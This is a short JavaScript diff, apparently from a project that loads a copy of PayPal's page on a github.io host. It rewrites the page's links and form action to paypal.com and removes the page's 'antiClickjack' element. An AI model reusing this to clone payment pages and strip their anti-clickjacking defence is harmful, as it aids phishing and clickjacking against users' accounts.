@@ -206,10 +206,10 @@ console.log(body)
          
                       for(let i=0; i<links.length; i++){
                           console.log(links[i].href)
-                          links[i].setAttribute('href', links[i].href.replace('http://localhost:3001', 'https://paypal.com'));
+                          links[i].setAttribute('href', links[i].href.replace('https://meuons.github.io/', 'https://paypal.com'));
                           console.log(links[i].href)
                       }
-                      forms[0].setAttribute('action', forms[0].action.replace('http://localhost:3001', 'https://paypal.com'))
+                      forms[0].setAttribute('action', forms[0].action.replace('https://meuons.github.io/', 'https://paypal.com'))
                       document.getElementById('antiClickjack').remove()
                   if (!response.ok) {
           
